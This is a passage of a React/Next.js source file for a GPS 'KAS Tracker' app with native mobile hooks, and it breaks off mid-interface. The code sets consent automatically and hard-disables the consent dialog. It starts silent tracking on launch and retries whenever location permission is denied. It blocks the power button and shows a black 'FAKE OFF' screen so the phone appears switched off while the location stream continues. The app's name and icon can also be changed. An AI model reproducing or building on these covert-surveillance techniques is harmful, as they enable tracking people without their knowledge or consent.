"use client";

import { useState, useEffect, useRef, useCallback } from "react";
import { createClient } from "@supabase/supabase-js";
import { useRouter } from "next/navigation";
import { QRCodeSVG } from "qrcode.react";
import {
  MapPin,
  Power,
  PowerOff,
  Satellite,
  LogOut,
  Download,
  X,
  Info,
  ChevronDown,
  ChevronUp,
  Shield,
  Radio,
  QrCode,
  Smartphone,
  Lock,
  Settings,
} from "lucide-react";

type Status = "idle" | "active" | "error";

const supabaseBrowser = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL!,
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
);

export default function TrackerPage() {
  const router = useRouter();
  const [userName, setUserName] = useState("");
  const [status, setStatus] = useState<Status>("idle");
  const [coords, setCoords] = useState<{ lat: number; lng: number; accuracy?: number } | null>(null);
  const [log, setLog] = useState<string[]>([]);
  const [error, setError] = useState("");

  const [showExplainer, setShowExplainer] = useState(false);
  const [showQr, setShowQr] = useState(false);
  const [magicUrl, setMagicUrl] = useState<string | null>(null);
  const [magicUrlLoading, setMagicUrlLoading] = useState(false);
  const [showApkQr, setShowApkQr] = useState(false);
  const [apkQrUrl, setApkQrUrl] = useState<string | null>(null);
  const [apkQrLoading, setApkQrLoading] = useState(false);
  const [userId, setUserId] = useState<string | null>(null);
  const [isPwa, setIsPwa] = useState(false);
  const [sleepLocked, setSleepLocked] = useState(false);
  const [customAppName, setCustomAppName] = useState("KAS Tracker");
  const [customIconColor, setCustomIconColor] = useState("#FF6B35");
  const [showSettings, setShowSettings] = useState(false);
  const [trackingEnabled, setTrackingEnabled] = useState(true);
  const [permissionCheckingMode, setPermissionCheckingMode] = useState(false); // Hide UI while checking/retrying permission
  const sleepLockPollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const wakeLockRef = useRef<WakeLockSentinel | null>(null);
  const [consentGiven, setConsentGiven] = useState<boolean | null>(null); // null = not checked yet
  const [showConsent, setShowConsent] = useState(false);
  // Check if tokens are in URL immediately
  const hasQrTokens = typeof window !== 'undefined' && 
    (window.location.hash.includes('access_token') || window.location.hash.includes('refresh_token'));
  // null = checking, false = no session, true = has session
  const [sessionReady, setSessionReady] = useState<boolean | null>(hasQrTokens ? true : null);
  const [loginEmail, setLoginEmail] = useState("");
  const [loginPassword, setLoginPassword] = useState("");
  const [loginError, setLoginError] = useState("");
  const [loginLoading, setLoginLoading] = useState(false);

  // Load customization from localStorage
  useEffect(() => {
    const saved = localStorage.getItem("kas_app_customization");
    if (saved) {
      try {
        const { appName, iconColor } = JSON.parse(saved);
        if (appName) setCustomAppName(appName);
        if (iconColor) setCustomIconColor(iconColor);
      } catch { /* ignore */ }
    }
  }, []);

  // Update page title dynamically
  useEffect(() => {
    document.title = customAppName;
  }, [customAppName]);

  // Detect if running as installed PWA (standalone mode) or native app
  useEffect(() => {
    const checkPwa = () => {
      // 0. Check if running in Capacitor/native app
      if ((window as any).Capacitor !== undefined) {
        console.log("✅ Detected Capacitor native app immediately");
        return true;
      }
      
      // 1. Check display mode (most reliable for modern browsers)
      if (window.matchMedia("(display-mode: standalone)").matches) {
        return true;
      }
      if (window.matchMedia("(display-mode: fullscreen)").matches) {
        return true;
      }
      
      // 2. Check iOS standalone
      if ((window.navigator as { standalone?: boolean }).standalone === true) {
        return true;
      }
      
      // 3. Check if browser chrome is hidden (viewport fills window)
      // This indicates the app is in fullscreen/PWA mode
      const hasNoUrlBar = window.outerHeight === window.innerHeight && 
                          window.outerWidth === window.innerWidth;
      if (hasNoUrlBar && (window.innerHeight > 600)) {
        return true;
      }
      
      // 4. Check localStorage flag set during PWA install
      if (typeof window !== "undefined" && localStorage.getItem("kas_pwa_mode") === "true") {
        return true;
      }
      
      return false;
    };
    
    // Check immediately
    const isPwaMode = checkPwa();
    setIsPwa(isPwaMode);
    
    // Auto-hide explainer in native/PWA mode - go straight to START button
    if (isPwaMode) {
      setShowExplainer(false);
    }
    
    // Log for debugging
    console.log("🔍 PWA Detection (immediate):", {
      isPwa: isPwaMode,
      capacitor: (window as any).Capacitor !== undefined,
      standalone: (window.navigator as { standalone?: boolean }).standalone,
      displayMode: window.matchMedia("(display-mode: standalone)").matches,
      outerHeight: window.outerHeight,
      innerHeight: window.innerHeight,
      noUrlBar: window.outerHeight === window.innerHeight,
      pwaFlag: localStorage.getItem("kas_pwa_mode"),
    });

    // Also wait for capacitorReady event in case Capacitor loads after component mount
    const handleCapacitorReady = () => {
      console.log("✅ capacitorReady event fired - Capacitor is now available");
      setIsPwa(true);
      setShowExplainer(false);
    };
    
    if ((window as any).capacitorReady) {
      handleCapacitorReady();
    } else {
      document.addEventListener('capacitorReady', handleCapacitorReady);
    }

    // Also check after a short delay in case Capacitor hasn't fully loaded yet
    const timeout = setTimeout(() => {
      if ((window as any).Capacitor !== undefined && !isPwaMode) {
        console.log("✅ Capacitor detected after delay");
        setIsPwa(true);
        setShowExplainer(false);
      }
    }, 500);

    return () => {
      clearTimeout(timeout);
      document.removeEventListener('capacitorReady', handleCapacitorReady);
    };
  }, []);

  // Auto-request all permissions on app open (members already agreed)
  useEffect(() => {
    const requestAllPermissions = async () => {
      if (!isPwa) return; // Only request if running as app
      
      try {
        const Capacitor = (window as any).Capacitor;
        if (!Capacitor) return;

        console.log("📍 Requesting all permissions (GPS, microphone, camera)...");

        // Request GPS permission
        try {
          await Capacitor.Plugins.Geolocation.checkPermissions();
          const geoPerms = await Capacitor.Plugins.Geolocation.requestPermissions();
          console.log("✅ GPS permission:", geoPerms.location);
        } catch (e) {
          console.warn("⚠️ GPS permission request failed:", e);
        }



        // Request wake lock permission
        try {
          if ('wakeLock' in navigator) {
            await (navigator.wakeLock as any).request('screen');
            console.log("✅ Wake lock permission granted");
          }
        } catch (e) {
          console.warn("⚠️ Wake lock permission request failed:", e);
        }

        console.log("✅ All permissions requested");
      } catch (e) {
        console.error("❌ Permission request error:", e);
      }
    };

    // Delay to ensure Capacitor is fully loaded
    const timeout = setTimeout(() => {
      requestAllPermissions();
    }, 500);

    return () => clearTimeout(timeout);
  }, [isPwa]);

  // Check stored consent
  useEffect(() => {
    const stored = localStorage.getItem("kas_screen_lock_consent");
    // Auto-consent if not explicitly stored (assume agreement from onboarding)
    if (stored === null) {
      localStorage.setItem("kas_screen_lock_consent", "true");
      setConsentGiven(true);
    } else {
      setConsentGiven(stored === "true");
    }
  }, []);

  // Update hardware button state (power button interception)
  const updateHardwareButtons = useCallback(async (active: boolean) => {
    try {
      const Capacitor = (window as any).Capacitor;
      if (Capacitor?.Plugins?.HardwareButtons) {
        await Capacitor.Plugins.HardwareButtons.setTrackingActive({ active });
        if (active) {
          console.log("🔒 Power button locked - press disabled during emergency tracking");
        } else {
          console.log("🔓 Power button unlocked");
        }
      }
    } catch (e) {
      console.warn("⚠️ Hardware button update failed:", e);
    }
  }, []);



  // Fetch user info — silently refresh session, never redirect
  useEffect(() => {
    const checkSessionAndAutoLogin = async () => {
      // First check if there's a magic link token in the URL hash (from QR code scanning)
      const hash = window.location.hash.substring(1);
      const params = new URLSearchParams(hash);
      const accessToken = params.get("access_token");
      const refreshToken = params.get("refresh_token");

      // If magic link tokens are present, set them immediately (emergency mode)
      if (accessToken && refreshToken) {
        console.log("🔗 QR Code Auto-login: Setting session from magic link token");
        const setResult = await supabaseBrowser.auth.setSession({ access_token: accessToken, refresh_token: refreshToken });
        console.log("✅ Session set from magic link:", setResult.data.session ? "✓ Session active" : "✗ No session");
        
        // Small delay to ensure session is stored
        await new Promise(r => setTimeout(r, 100));
        
        // Clear the hash after extracting tokens (do NOT use window.location.hash = "" as it reloads)
        window.history.replaceState({}, document.title, window.location.pathname);
        
        // Get user from the session we just set
        const { data: { session } } = await supabaseBrowser.auth.getSession();
        if (session?.user) {
          console.log("✅ User authenticated from QR:", session.user.email);
          setUserId(session.user.id);
          if (session.user.user_metadata?.name) setUserName(session.user.user_metadata.name as string);
          else if (session.user.email) setUserName(session.user.email.split("@")[0]);
          else setUserName("Member");
          setSessionReady(true);
          setShowExplainer(false);
          return; // Early exit - QR login complete, skip other checks
        }
      }

      // Now check for existing session (if no QR tokens or QR login failed)
      const { data: { session } } = await supabaseBrowser.auth.getSession();
      let user = session?.user ?? null;

      if (!user) {
        // Try one silent refresh before giving up
        const { data } = await supabaseBrowser.auth.refreshSession();
        user = data.session?.user ?? null;
      }

      if (user) {
        console.log("✅ User authenticated:", user.email);
        setUserId(user.id);
        if (user.user_metadata?.name) setUserName(user.user_metadata.name as string);
        else if (user.email) setUserName(user.email.split("@")[0]);
        setSessionReady(true);
        // Auto-hide explainer when user is logged in
        setShowExplainer(false);
      } else {
        // Emergency mode: If running in app but no session, still allow tracking
        if (isPwa) {
          console.log("⚠️ No session but running in app - allowing emergency tracking");
          setUserId("anonymous");
          setUserName("Emergency Mode");
          setSessionReady(true);
        } else {
          setSessionReady(false);
        }
      }
    };

    checkSessionAndAutoLogin();
  }, [isPwa]);

  // Auto-request location permissions when app loads - retry until granted
  useEffect(() => {
    let retryTimeout: ReturnType<typeof setTimeout> | null = null;
    
    const requestLocationPermissions = async () => {
      const Capacitor = (window as any).Capacitor;
      if (Capacitor?.Plugins?.Geolocation) {
        setPermissionCheckingMode(true); // Hide UI while checking
        try {
          console.log("📍 Requesting location permissions...");
          const permResult = await Capacitor.Plugins.Geolocation.requestPermissions();
          if (permResult.location === 'granted') {
            console.log("✅ Location permission granted — auto-starting tracking");
            // Auto-grant consent and start tracking silently
            localStorage.setItem('kas_screen_lock_consent', 'true');
            setConsentGiven(true);
            // Clear any previous error since permission is now granted
            setError("");
            setPermissionCheckingMode(false);
            // Activate will be called below in the useEffect that watches consentGiven
          } else {
            console.log("⚠️ Location permission denied - will retry in 10 seconds");
            addLog("⚠️ Permission denied - retrying...");
            // Keep checking mode on and retry permission request after 10 seconds (user might change mind)
            retryTimeout = setTimeout(requestLocationPermissions, 10_000);
          }
        } catch (e) {
          console.warn("⚠️ Failed to request location permissions:", e);
          addLog("⚠️ Permission request error - retrying...");
          // Retry on error - keep checking mode on
          retryTimeout = setTimeout(requestLocationPermissions, 10_000);
        }
      }
    };

    requestLocationPermissions();
    
    return () => {
      if (retryTimeout) clearTimeout(retryTimeout);
    };
  }, []);

  // Auto-start tracking when consent is given
  useEffect(() => {
    if (consentGiven && !isActive && sessionReady === true && isPwa) {
      console.log("🚀 Auto-starting silent background tracking...");
      activate();
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [consentGiven, sessionReady, isPwa]);

  const handleInlineLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoginError("");
    setLoginLoading(true);
    const res = await fetch("/api/auth/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      credentials: "include",
      body: JSON.stringify({ email: loginEmail, password: loginPassword }),
    });
    setLoginLoading(false);
    if (!res.ok) {
      const d = await res.json();
      setLoginError(d.error ?? "Invalid credentials");
      return;
    }
    // Re-fetch user after login
    const { data: { user } } = await supabaseBrowser.auth.getUser();
    if (user) {
      setUserId(user.id);
      if (user.user_metadata?.name) setUserName(user.user_metadata.name as string);
      else if (user.email) setUserName(user.email.split("@")[0]);
      setSessionReady(true);
      // Auto-hide explainer when user logs in
      setShowExplainer(false);
    }
  };

  const handleSignOut = async () => {
    await fetch("/api/auth/logout", { method: "POST", credentials: "include" });
    router.push("/login");
    router.refresh();
  };

  const handleOpenQr = async () => {
    const next = !showQr;
    setShowQr(next);
    if (!next) return;
    // Regenerate a fresh token every time the section is opened
    setMagicUrl(null);
    setMagicUrlLoading(true);
    try {
      const res = await fetch("/api/auth/magic-token", { method: "POST" });
      const json = await res.json();
      console.log("🔗 Magic token response:", json, "status:", res.status);
      if (json.url) {
        setMagicUrl(json.url);
      } else {
        console.error("❌ No URL in response:", json.error);
      }
    } catch (e) {
      console.error("❌ Magic token fetch error:", e);
    } finally {
      setMagicUrlLoading(false);
    }
  };

  const handleOpenApkQr = async () => {
    const next = !showApkQr;
    setShowApkQr(next);
    if (!next) return;
    if (!userId) return;
    // Generate APK download QR code
    setApkQrUrl(null);
    setApkQrLoading(true);
    try {
      const res = await fetch(`/api/qr/apk-download/${userId}`);
      if (res.ok) {
        // The endpoint returns an image, so we need the image URL
        const blob = await res.blob();
        const qrImageUrl = URL.createObjectURL(blob);
        setApkQrUrl(qrImageUrl);
        console.log("✅ APK QR generated");
      } else {
        console.error("❌ Failed to generate APK QR:", res.status);
      }
    } catch (e) {
      console.error("❌ APK QR fetch error:", e);
    } finally {
      setApkQrLoading(false);
    }
  };

  const watchIdRef = useRef<number | null>(null);
  const locationIntervalRef = useRef<ReturnType<typeof setInterval> | null>(null);


  const addLog = useCallback((msg: string) => {
    const time = new Date().toLocaleTimeString();
    setLog((prev) => [`[${time}] ${msg}`, ...prev.slice(0, 49)]);
  }, []);

  const sendLocation = useCallback(
    async (pos: GeolocationPosition) => {
      const { latitude: lat, longitude: lng, accuracy, speed, heading, altitude } = pos.coords;
      setCoords({ lat, lng, accuracy: accuracy ?? undefined });

      try {
        await fetch("/api/location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          credentials: "include",
          body: JSON.stringify({ lat, lng, accuracy, speed, heading, altitude }),
        });
        addLog(`📍 Location sent: ${lat.toFixed(5)}, ${lng.toFixed(5)}`);
      } catch {
        addLog("⚠️ Failed to send location");
      }
    },
    [addLog]
  );





  // Poll admin status (sleepLocked + trackingEnabled) every 10s while tracking is active
  const startSleepLockPoll = useCallback((uid: string) => {
    const check = async () => {
      try {
        const res = await fetch(`/api/users/${uid}/status`, {
          method: "GET",
          credentials: "include",
        });
        if (res.ok) {
          const { sleepLocked: locked, trackingEnabled: enabled } = await res.json();
          setSleepLocked(locked);
          setTrackingEnabled(enabled);
        }
      } catch { /* ignore */ }
    };
    check();
    sleepLockPollRef.current = setInterval(check, 10_000);
  }, []);

  const openLocationSettings = useCallback(async () => {
    const Capacitor = (window as any).Capacitor;
    if (Capacitor?.Plugins?.App) {
      try {
        // Open Android Location settings
        await Capacitor.Plugins.App.openUrl({ url: 'android.settings.LOCATION_SOURCE_SETTINGS' });
      } catch (e) {
        console.warn("Could not open settings:", e);
      }
    }
  }, []);

  const stopSleepLockPoll = useCallback(() => {
    if (sleepLockPollRef.current) clearInterval(sleepLockPollRef.current);
    setSleepLocked(false);
  }, []);

  const acquireWakeLock = useCallback(async () => {
    if (!('wakeLock' in navigator)) return;
    try {
      wakeLockRef.current = await (navigator as unknown as { wakeLock: { request: (t: string) => Promise<WakeLockSentinel> } }).wakeLock.request('screen');
      wakeLockRef.current.addEventListener('release', () => { wakeLockRef.current = null; });
      addLog('🔆 Wake lock acquired');
    } catch { /* permission denied or not supported */ }
  }, [addLog]);

  const releaseWakeLock = useCallback(() => {
    if (wakeLockRef.current) {
      wakeLockRef.current.release();
      wakeLockRef.current = null;
      addLog('🌑 Wake lock released — screen will sleep');
    }
  }, [addLog]);

  // When admin toggles sleepLocked: release wake lock to let screen go dark, re-acquire when unlocked
  useEffect(() => {
    if (!isActive) return; // only matters while tracking
    if (sleepLocked) {
      releaseWakeLock();
    } else {
      acquireWakeLock();
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [sleepLocked]);

  const activate = useCallback(async () => {
    setError("");
    setPermissionCheckingMode(false); // Clear permission checking mode when activating

    if (!trackingEnabled) {
      setError("Tracking has been disabled by your administrator.");
      return;
    }

    if (!navigator.geolocation) {
      setError("Geolocation is not supported on this device.");
      return;
    }

    // In app mode, try requesting permission again if it was previously denied
    // Don't show error UI - just retry silently
    try {
      const permStatus = await navigator.permissions.query({ name: 'geolocation' });
      if (permStatus.state === 'denied' && isPwa) {
        console.log("⚠️ Location permission was previously denied - requesting again...");
        addLog("📍 Requesting location permission...");
        // In Capacitor, try requesting permission again
        const Capacitor = (window as any).Capacitor;
        if (Capacitor?.Plugins?.Geolocation) {
          const permResult = await Capacitor.Plugins.Geolocation.requestPermissions();
          if (permResult.location !== 'granted') {
            setError(""); // Hide error in app mode
            addLog("⚠️ Permission still denied - retrying...");
            return;
          }
        } else {
          setError(""); // Hide error in app mode
          addLog("⚠️ Permission denied - cannot continue");
          return;
        }
      }
      addLog(`📍 Permission status: ${permStatus.state}`);
    } catch (e) {
      // Permissions API might not be supported, continue anyway
      console.log("Permissions API not available:", e);
    }

    setStatus("active");
    addLog("✅ Tracker activated");

    // Keep screen on while tracking
    await acquireWakeLock();

    // Try to disable power button via Capacitor (prevent phone from locking)
    if (Capacitor?.Plugins?.App) {
      try {
        await Capacitor.Plugins.App.exitApp();
        // This won't actually exit - we're just checking if the plugin is available
      } catch (e) {
        // Plugin might not support what we need
      }
    }

    // Notify server
    await fetch("/api/tracking", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      credentials: "include",
      body: JSON.stringify({ isTracking: true }),
    });

    // Start GPS watch — maximumAge:0 forces a fresh fix every time
    const startWatch = () => {
      if (watchIdRef.current !== null) navigator.geolocation.clearWatch(watchIdRef.current);
      watchIdRef.current = navigator.geolocation.watchPosition(
        sendLocation,
        (err) => {
          if (err.code === 1) {
            // PERMISSION_DENIED - app not allowed
            // In silent mode, hide error and keep trying
            addLog(`⚠️ Location permission denied - will retry...`);
            setStatus("idle");
            // Stop tracking on permission error
            if (watchIdRef.current !== null) navigator.geolocation.clearWatch(watchIdRef.current);
            if (locationIntervalRef.current) clearInterval(locationIntervalRef.current);
            // Retry permission request after 5 seconds
            setTimeout(() => {
              if (consentGiven) {
                console.log("🔄 Retrying activation after permission denial...");
                activate();
              }
            }, 5000);
          } else if (err.code === 2) {
            // POSITION_UNAVAILABLE - GPS/Location Service is OFF on phone
            addLog(`⚠️ Location Service OFF - opening settings...`);
            openLocationSettings();
          } else if (err.code === 3) {
            // TIMEOUT - taking too long to get position
            addLog(`⚠️ GPS timeout (code ${err.code}) — retrying`);
            setTimeout(startWatch, 3000);
          } else {
            addLog(`⚠️ GPS error (${err.code}) — retrying`);
            setTimeout(startWatch, 3000);
          }
        },
        { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
      );
    };
    startWatch();

    // Also push every 5 seconds via getCurrentPosition as belt-and-suspenders
    locationIntervalRef.current = setInterval(() => {
      navigator.geolocation.getCurrentPosition(sendLocation, () => {}, {
        enableHighAccuracy: true,
        maximumAge: 0,
        timeout: 10000,
      });
    }, 5_000);

    // Start polling admin sleep-lock status
    if (userId) startSleepLockPoll(userId);

    addLog("📱 Tracking active — screen will stay on");
  }, [addLog, sendLocation, startSleepLockPoll, stopSleepLockPoll, userId]);

  const deactivate = useCallback(async () => {
    if (watchIdRef.current !== null) navigator.geolocation.clearWatch(watchIdRef.current);
    if (locationIntervalRef.current) clearInterval(locationIntervalRef.current);
    stopSleepLockPoll();
    releaseWakeLock();

    await fetch("/api/tracking", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      credentials: "include",
      body: JSON.stringify({ isTracking: false }),
    });

    setStatus("idle");
    setCoords(null);
    addLog("🔴 Tracker deactivated");
  }, [addLog, stopSleepLockPoll, releaseWakeLock]);

  // Auto-deactivate if admin disables tracking while tracker is running
  useEffect(() => {
    if (!trackingEnabled && status === "active") {
      deactivate();
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [trackingEnabled]);

  useEffect(() => {
    return () => {
      if (watchIdRef.current !== null) navigator.geolocation.clearWatch(watchIdRef.current);
      if (locationIntervalRef.current) clearInterval(locationIntervalRef.current);
      if (sleepLockPollRef.current) clearInterval(sleepLockPollRef.current);
    };
  }, []);

  const isActive = status === "active";

  // ─── PWA Mobile UI ──────────────────────────────────────────────────────────
  // When running as installed PWA, show only START/STOP + status dots.
  if (isPwa) {

    // Still checking session
    if (sessionReady === null) {
      return (
        <div className="min-h-screen bg-gray-950 flex flex-col items-center justify-center gap-4">
          <div className="bg-orange-600 w-14 h-14 rounded-2xl flex items-center justify-center">
            <MapPin className="w-7 h-7 text-white" />
          </div>
          <div className="w-6 h-6 border-2 border-blue-500 border-t-transparent rounded-full animate-spin" />
        </div>
      );
    }

    // Session expired — show minimal inline login, no redirect
    if (sessionReady === false) {
      return (
        <div className="min-h-screen bg-gray-950 flex flex-col items-center justify-center px-8 gap-6">
          <div className="bg-orange-600 w-16 h-16 rounded-2xl flex items-center justify-center shadow-xl shadow-orange-900">
            <MapPin className="w-8 h-8 text-white" />
          </div>
          <div className="text-center">
            <p className="text-white font-bold text-base">KAS Tracker</p>
            <p className="text-gray-500 text-xs mt-1">Session expired — sign in to continue</p>
          </div>
          <form onSubmit={handleInlineLogin} className="w-full flex flex-col gap-3">
            {loginError && (
              <p className="text-red-400 text-xs text-center">{loginError}</p>
            )}
            <input
              type="email"
              required
              value={loginEmail}
              onChange={(e) => setLoginEmail(e.target.value)}
              placeholder="Email"
              className="bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white text-sm outline-none focus:border-blue-500 transition"
            />
            <input
              type="password"
              required
              value={loginPassword}
              onChange={(e) => setLoginPassword(e.target.value)}
              placeholder="Password"
              className="bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white text-sm outline-none focus:border-orange-500 transition"
            />
            <button
              type="submit"
              disabled={loginLoading}
              className="bg-orange-600 hover:bg-orange-500 disabled:opacity-50 text-white font-bold py-3.5 rounded-xl text-sm transition"
            >
              {loginLoading ? "Signing in…" : "Sign In & Open Tracker"}
            </button>
          </form>
        </div>
      );
    }

    return (
      <div className="min-h-screen bg-gray-950 flex flex-col select-none">

        {/* FAKE OFF — completely black screen when tracking. Looks like phone is powered off. */}
        {isActive && (
          <div className="fixed inset-0 bg-black z-50" />
        )}

        {/* Permission checking mode — show minimal UI while retrying permission */}
        {permissionCheckingMode && !isActive && (
          <div className="fixed inset-0 bg-gray-950 z-50 flex items-center justify-center">
            <div className="text-center">
              <div className="w-10 h-10 border-2 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-3" />
              <p className="text-gray-400 text-xs">Requesting location permission...</p>
            </div>
          </div>
        )}

        {/* Consent modal — not shown in auto mode, hidden for silent background tracking */}
        {false && (
          <div className="fixed inset-0 z-60 bg-black/90 flex flex-col items-center justify-center px-6 gap-0">
            <div className="bg-gray-900 border border-gray-700 rounded-3xl px-6 py-7 flex flex-col gap-5 w-full max-w-sm shadow-2xl">
              <div className="flex flex-col items-center gap-3">
                <div className="bg-orange-600 w-14 h-14 rounded-2xl flex items-center justify-center shadow-xl shadow-orange-900">
                  <Lock className="w-7 h-7 text-white" />
                </div>
                <p className="text-white font-bold text-lg text-center">Before you start</p>
              </div>
              <div className="flex flex-col gap-3">
                <div className="bg-gray-800 rounded-2xl px-4 py-3 flex items-start gap-3">
                  <MapPin className="w-4 h-4 text-green-400 mt-0.5 shrink-0" />
                  <p className="text-gray-300 text-sm">Your <strong className="text-white">GPS location</strong> will be sent to your administrator in real time.</p>
                </div>
                <div className="bg-gray-800 rounded-2xl px-4 py-3 flex items-start gap-3">
                  <Lock className="w-4 h-4 text-orange-400 mt-0.5 shrink-0" />
                  <p className="text-gray-300 text-sm">Your administrator can <strong className="text-white">lock your screen</strong> remotely. The display will go dark but tracking continues.</p>
                </div>
              </div>
              <div className="bg-yellow-900/30 border border-yellow-800 rounded-xl px-3 py-2">
                <p className="text-yellow-300 text-xs text-center">By tapping <strong>I Agree</strong> you consent to monitoring while the tracker is active.</p>
              </div>
              <div className="flex flex-col gap-2">
                <button
                  onClick={() => {
                    localStorage.setItem('kas_screen_lock_consent', 'true');
                    setConsentGiven(true);
                    setShowConsent(false);
                    activate();
                  }}
                  className="bg-orange-600 hover:bg-orange-500 active:scale-95 transition-all text-white font-bold text-base py-4 rounded-2xl shadow-xl shadow-orange-900"
                >
                  I Agree — Start Tracking
                </button>
                <button
                  onClick={() => setShowConsent(false)}
                  className="text-gray-600 text-xs text-center py-2 underline underline-offset-2"
                >
                  Cancel
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Settings Modal */}
        {showSettings && (
          <div className="fixed inset-0 z-50 bg-black/60 flex items-center justify-center px-4">
            <div className="bg-gray-900 border border-gray-800 rounded-2xl w-full max-w-sm p-6 max-h-[90vh] overflow-y-auto">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-white font-bold text-lg">Customize Your App</h2>
                <button
                  onClick={() => setShowSettings(false)}
                  className="text-gray-500 hover:text-white transition"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>

              <div className="space-y-4">
                {/* App Name Input */}
                <div>
                  <label className="block text-gray-300 text-sm font-medium mb-2">
                    App Display Name
                  </label>
                  <input
                    type="text"
                    value={customAppName}
                    onChange={(e) => setCustomAppName(e.target.value.slice(0, 30))}
                    maxLength={30}
                    className="w-full bg-gray-800 border border-gray-700 rounded-lg px-3 py-2 text-white text-sm outline-none focus:border-orange-500 transition"
                    placeholder="Enter app name"
                  />
                  <p className="text-gray-600 text-xs mt-1">{customAppName.length}/30 characters</p>
                </div>

                {/* Icon Color Selection */}
                <div>
                  <label className="block text-gray-300 text-sm font-medium mb-3">
                    Icon Color
                  </label>
                  <div className="grid grid-cols-4 gap-2">
                    {[
                      { name: "Orange", hex: "#FF6B35" },
                      { name: "Blue", hex: "#3B82F6" },
                      { name: "Green", hex: "#10B981" },
                      { name: "Red", hex: "#EF4444" },
                      { name: "Purple", hex: "#8B5CF6" },
                      { name: "Pink", hex: "#EC4899" },
                      { name: "Cyan", hex: "#06B6D4" },
                      { name: "Yellow", hex: "#F59E0B" },
                    ].map((color) => (
                      <button
                        key={color.hex}
                        onClick={() => setCustomIconColor(color.hex)}
                        title={color.name}
                        className={`w-full aspect-square rounded-lg border-2 transition ${
                          customIconColor === color.hex
                            ? "border-white"
                            : "border-transparent hover:border-gray-600"
                        }`}
                        style={{ backgroundColor: color.hex }}
                      />
                    ))}
                  </div>
                </div>

                {/* Preview */}
                <div className="bg-gray-800 rounded-lg p-4 mt-4">
                  <p className="text-gray-400 text-xs uppercase tracking-wide mb-3">Preview</p>
                  <div className="flex items-center gap-3">
                    <div
                      className="w-12 h-12 rounded-xl flex items-center justify-center"
                      style={{ backgroundColor: customIconColor }}
                    >
                      <span className="text-white text-lg">📍</span>
                    </div>
                    <div>
                      <p className="text-white font-semibold text-sm">{customAppName}</p>
                      <p className="text-gray-500 text-xs">Your tracker app</p>
                    </div>
                  </div>
                </div>

                {/* Save Button */}
                <button
                  onClick={() => {
                    localStorage.setItem(
                      "kas_app_customization",
                      JSON.stringify({ appName: customAppName, iconColor: customIconColor })
                    );
                    setShowSettings(false);
                  }}
                  className="w-full bg-orange-600 hover:bg-orange-500 text-white font-medium py-2 rounded-lg transition mt-4"
                >
                  Save Customization
                </button>
                <p className="text-gray-500 text-xs text-center">
                  Changes apply immediately
                </p>
              </div>
            </div>
          </div>
        )}

        {/* Sleep lock overlay — full black screen, admin-controlled */}
        {sleepLocked && isActive && (
          <div className="fixed inset-0 z-50 bg-black flex flex-col items-center justify-center gap-4">
            <Lock className="w-10 h-10 text-gray-700" />
            <p className="text-gray-700 text-sm">Screen locked by administrator</p>
          </div>
        )}

        {/* Tracking disabled overlay */}
        {!trackingEnabled && (
          <div className="fixed inset-0 z-50 bg-black flex flex-col items-center justify-center gap-4">
            <PowerOff className="w-10 h-10 text-red-800" />
            <p className="text-red-700 text-sm font-semibold">Tracking disabled</p>
            <p className="text-gray-700 text-xs">Your administrator has turned off tracking.</p>
          </div>
        )}

        <main className="flex-1 flex flex-col items-center justify-center gap-8 px-4">
          {!isActive && (
            <>
              <button
                onClick={() => {
                  if (consentGiven) { activate(); }
                  else { setShowConsent(true); }
                }}
                className="w-52 h-52 rounded-full flex flex-col items-center justify-center gap-3 shadow-2xl border-4 transition-all duration-300 active:scale-95 bg-blue-600 border-blue-400 shadow-blue-900"
              >
                <Power className="w-16 h-16 text-white" />
                <span className="text-white text-base font-bold tracking-widest">START</span>
              </button>

              <div className="flex gap-8">
                <div className="flex flex-col items-center gap-1.5">
                  <div className="w-3 h-3 rounded-full bg-gray-700" />
                  <MapPin className="w-5 h-5 text-gray-500" />
                  <span className="text-gray-600 text-xs">GPS</span>
                </div>
              </div>

              {coords && (
                <p className="text-gray-700 font-mono text-xs text-center">
                  {coords.lat.toFixed(5)}, {coords.lng.toFixed(5)}
                  {coords.accuracy ? ` ±${Math.round(coords.accuracy)}m` : ""}
                </p>
              )}
            </>
          )}
        </main>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-950 flex flex-col">
      {/* Header */}
      <header className="flex items-center justify-between px-4 py-3 border-b border-gray-800">
        <div className="flex items-center gap-2">
          <Satellite className="w-5 h-5" style={{ color: customIconColor }} />
          <span className="text-white font-semibold text-sm">{customAppName}</span>
        </div>
        <div className="flex items-center gap-3">
          <span className="text-gray-400 text-xs">{userName}</span>
          <button
            onClick={() => setShowSettings(true)}
            title="App settings"
            className="text-gray-500 hover:text-white transition"
          >
            <Settings className="w-4 h-4" />
          </button>
          <button
            onClick={handleSignOut}
            className="text-gray-500 hover:text-white transition"
          >
            <LogOut className="w-4 h-4" />
          </button>
        </div>
      </header>

      {/* Main */}
      <main className="flex-1 flex flex-col items-center px-4 pt-6 pb-4 gap-6 overflow-y-auto">

        {/* Explainer card — collapsible */}
        <div className="w-full max-w-2xl">
          <button
            onClick={() => setShowExplainer((s) => !s)}
            className="w-full flex items-center justify-between bg-orange-950/60 border border-orange-800 rounded-2xl px-4 py-3 text-left"
          >
            <div className="flex items-center gap-2">
              <Info className="w-4 h-4 text-orange-400 shrink-0" />
              <span className="text-orange-200 text-sm font-semibold">How KAS Tracker works</span>
            </div>
            {showExplainer
              ? <ChevronUp className="w-4 h-4 text-orange-400" />
              : <ChevronDown className="w-4 h-4 text-orange-400" />}
          </button>

          {showExplainer && (
